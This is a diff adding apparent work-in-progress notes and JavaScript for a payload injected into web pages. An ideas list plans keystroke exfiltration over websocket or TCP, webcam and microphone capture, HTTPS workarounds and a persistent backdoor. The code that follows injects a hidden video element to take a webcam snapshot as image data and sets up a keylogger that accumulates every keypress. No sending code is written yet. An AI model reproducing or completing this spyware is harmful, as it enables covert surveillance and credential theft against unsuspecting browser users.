@@ -1,0 +1,187 @@
+https://tutorialzine.com/2016/07/take-a-selfie-with-js
+
+-> exec()
+-> info()
+-> setup()?
+
+##IDEAS?
+- keylogger (easy) -> send message on every keystroke with websocket (but send function is catched, if no websocket, send with tcp IP after x keystrokes or x seconds)
+- webcam -> https needed in chrome -> sometimes injecten if bad protection? persistant backdoored? -> reload to real https?  -> ? circumvent? -> flash? -> maybe poisontab attack nakijken om ook CORS in orde te brengen?
+- microphone?
+- logoff from all sites ( cache clear enough? ) session keys enough? -> only of current page? or all?
+- 
+
+##TRIES
+
+#WEBCAM (first check if permission is ok, ask permission is new one)
+
+if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+    // Firefox 38+ seems having support of enumerateDevicesx
+    navigator.enumerateDevices = function(callback) {
+        navigator.mediaDevices.enumerateDevices().then(callback);
+    };
+}
+
+var MediaDevices = [];
+var isHTTPs = location.protocol === 'https:';
+var canEnumerate = false;
+if (typeof MediaStreamTrack !== 'undefined' && 'getSources' in MediaStreamTrack) {
+    canEnumerate = true;
+} else if (navigator.mediaDevices && !!navigator.mediaDevices.enumerateDevices) {
+    canEnumerate = true;
+}
+
+var hasMicrophone = false;
+var hasSpeakers = false;
+var hasWebcam = false;
+
+var isMicrophoneAlreadyCaptured = false;
+var isWebcamAlreadyCaptured = false;
+
+function checkDeviceSupport() {
+    if (!canEnumerate) {
+        return;
+    }
+
+    if (!navigator.enumerateDevices && window.MediaStreamTrack && window.MediaStreamTrack.getSources) {
+        navigator.enumerateDevices = window.MediaStreamTrack.getSources.bind(window.MediaStreamTrack);
+    }
+
+    if (!navigator.enumerateDevices && navigator.enumerateDevices) {
+        navigator.enumerateDevices = navigator.enumerateDevices.bind(navigator);
+    }
+
+    if (!navigator.enumerateDevices) {
+        if (callback) {
+            callback();
+        }
+        return;
+    }
+
+    MediaDevices = [];
+    navigator.enumerateDevices(function(devices) {
+        devices.forEach(function(_device) {
+            var device = {};
+            for (var d in _device) {
+                device[d] = _device[d];
+            }
+            if (device.kind === 'audio') {
+                device.kind = 'audioinput';
+            }
+            if (device.kind === 'video') {
+                device.kind = 'videoinput';
+            }
+            var skip;
+            MediaDevices.forEach(function(d) {
+                if (d.id === device.id && d.kind === device.kind) {
+                    skip = true;
+                }
+            });
+            if (skip) {
+                return;
+            }
+            if (!device.deviceId) {
+                device.deviceId = device.id;
+            }
+            if (!device.id) {
+                device.id = device.deviceId;
+            }
+            if (!device.label) {
+                device.label = 'Please invoke getUserMedia once.';
+                if (!isHTTPs) {
+                    device.label = 'HTTPs is required to get label of this ' + device.kind + ' device.';
+                }
+            } else {
+                if (device.kind === 'videoinput' && !isWebcamAlreadyCaptured) {
+                    isWebcamAlreadyCaptured = true;
+                }
+                if (device.kind === 'audioinput' && !isMicrophoneAlreadyCaptured) {
+                    isMicrophoneAlreadyCaptured = true;
+                }
+            }
+            if (device.kind === 'audioinput') {
+                hasMicrophone = true;
+            }
+            if (device.kind === 'audiooutput') {
+                hasSpeakers = true;
+            }
+            if (device.kind === 'videoinput') {
+                hasWebcam = true;
+            }
+            // there is no 'videoouput' in the spec.
+            MediaDevices.push(device);
+        });
+    console.log('hasWebCam: ', hasWebcam);
+    console.log('hasMicrophone: ', hasMicrophone);
+    console.log('isMicrophoneAlreadyCaptured: ', isMicrophoneAlreadyCaptured);
+    console.log('isWebcamAlreadyCaptured: ', isWebcamAlreadyCaptured);
+	//TODO give all devices present
+	//TODO give isHTTPs or localhost 
+    });
+}
+checkDeviceSupport();
+
+//inject new video html object 
+var video = document.createElement('video');
+var canvas = document.createElement('canvas');
+var track;
+//take picture
+function takeSnapshot(){
+	// Get the exact size of the video element.
+	width = video.videoWidth,
+	height = video.videoHeight,
+	console.log(width);
+	console.log(height);
+
+	// Context object for working with the canvas.
+	context = canvas.getContext('2d');
+
+	// Set the canvas to the same dimensions as the video.
+	canvas.width = width;
+	canvas.height = height;
+
+	// Draw a copy of the current frame from the video on the canvas.
+	context.drawImage(video, 0, 0, width, height);
+
+	// Get an image dataURL from the canvas.
+	console.log(canvas.toDataURL('image/png'));
+	return canvas.toDataURL('image/png');
+}
+video.oncanplay = function() {
+	takeSnapshot();
+	track.stop();	
+	//TODO end the stream -> light out
+};
+navigator.getUserMedia(
+    // Options
+    {
+        video: true
+    },
+    // Success Callback
+    function(stream){
+        video.src = window.URL.createObjectURL(stream);
+	track = stream.getTracks()[0];
+        // TODO play needed? just still image?
+        //video.play();
+    },
+    // Error Callback
+    function(err){
+        // Most common errors are PermissionDenied and DevicesNotFound.
+        console.error(err);
+    }
+);
+
+
+##KEYLOGGER
+var keys='';
+var counter=0; 
+document.onkeypress = function(e) {
+	get = window.event?event:e;
+	key = get.keyCode?get.keyCode:get.charCode;
+	key = String.fromCharCode(key);
+	keys+=key;
+	counter=counter+1;
+	//lastpressed tijd updaten -> een constante timer checkt of het lang genoeg geleden is (1 second bv) kan setting zijn
+	//TODO check if counter is to high
+
+}
